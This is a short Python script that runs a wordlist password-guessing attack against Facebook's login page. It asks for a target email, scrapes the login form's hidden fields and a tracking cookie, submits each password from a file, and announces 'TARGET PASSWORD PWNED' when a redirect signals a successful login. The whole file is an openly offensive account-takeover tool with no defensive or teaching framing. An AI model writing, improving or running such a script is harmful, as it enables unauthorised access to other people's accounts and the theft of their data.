from bs4 import BeautifulSoup
import requests, re
import sys, os

SPECIFIED_WORDLIST = "passwords.txt"
POST_URL = "https://www.facebook.com/login.php"
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))+"/"

MIN_PASSWORD_LENGTH = 6;

def PASSWORD_TEST(mail, password):
    session = requests.Session()
    r = session.get(POST_URL, allow_redirects=False)
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.find('form', id='login_form').findAll('input', {'type': ['hidden', 'submit']})
    post_data = {input.get('name'): input.get('value')  for input in inputs}
    post_data['email'] = mail
    post_data['pass'] = password
    scripts = soup.findAll('script')
    scripts_string = '/n/'.join([script.text for script in scripts])
    datr_search = re.search('\["_js_datr","([^"]*)"', scripts_string, re.DOTALL)
    if datr_search:
        datr = datr_search.group(1)
        cookies = {'_js_datr' : datr}
    else:
        return False
    return session.post(POST_URL, data=post_data, cookies=cookies, allow_redirects=False)

#print(facebook_login("Samim C. Sulog", "ONLINE CLASSS SUCKS"));

if __name__ == "__main__":
    password_data = open(CURRENT_PATH+SPECIFIED_WORDLIST).readlines();
    print("Password file selected: ", SPECIFIED_WORDLIST);
    email = input('Enter Email/ID to target: ').strip();
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip();
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        IS_CRACKED = PASSWORD_TEST(email, password);
        if IS_CRACKED.status_code == 302:
            print("TARGET PASSWORD PWNED. FINISHING....")
            break
        #if is_this_a_password(email, index, password):
           # break
